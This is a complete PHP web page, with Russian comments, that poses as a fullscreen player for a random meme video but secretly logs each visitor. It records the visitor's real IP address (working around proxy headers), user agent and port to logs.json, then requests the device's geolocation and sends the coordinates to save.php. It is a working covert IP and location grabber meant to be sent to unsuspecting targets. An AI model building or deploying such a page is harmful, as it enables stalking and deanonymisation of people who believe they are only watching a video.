<?php
// index.php
session_start();

// Установка временной зоны Узбекистана (Ташкент) для точной фиксации кликов
date_default_timezone_set('Asia/Tashkent');

// Функция продвинутого определения реального IP пользователя в обход прокси-серверов
function getRealIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                // Валидация публичного IP-адреса
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
            // Если публичный IP не найден, но передан валидный локальный IP
            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
                return $_SERVER[$key];
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s'); // Время фиксируется по Ташкенту
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

// Массив со 100% рабочими юмористическими видео и мемами, открытыми для встраивания:
$videos = [
    'dQw4w9WgXcQ', // Рикролл (Главный мем-пранк интернета, всегда работает)
    'QH2-TGUlwu4', // Легендарный чихающий панда (Классический юмор)
    'tntOCGkgt98', // Кот, поющий "пипа по па" (Популярный мем)
    'FzRH3iWPPr4', // Курьезные эпичные фейлы и смешные животные
    '9bZkp7q19f0'  // PSY - GANGNAM STYLE (Энергично и весело)
];

// Случайный выбор видео из списка для каждого нового посетителя
$random_video = $videos[array_rand($videos)];

// Структура записи для хранения в базе данных логов
$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

// Сохраняем ID текущей сессии для связки с AJAX-обработчиком координат
$_SESSION['current_log_id'] = $log_entry['id'];

// Запись первичных данных в файл logs.json
$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Воспроизведение...</title>
    <style>
        /* Стили для создания абсолютно полноэкранного плеера без рамок */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
        }
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            background: #000;
        }
    </style>
</head>
<body>

<!-- Надежный iframe плеер со случайным юморным видео -->
<iframe 
    class="fullscreen-video"
    src="https://www.youtube.com/embed/<?php echo $random_video; ?>?autoplay=1&mute=1&loop=1&playlist=<?php echo $random_video; ?>&controls=1&rel=0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
</iframe>

<script>
// Запрос координат устройства средствами браузера
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const data = new FormData();
        data.append('lat', position.coords.latitude);
        data.append('lon', position.coords.longitude);

        // Отправка полученных координат в save.php
        fetch('save.php', {
            method: 'POST',
            body: data
        });
    }, function(error) {
        console.log("Доступ к геопозиции не предоставлен устройством.");
    });
}
</script>
</body>
</html>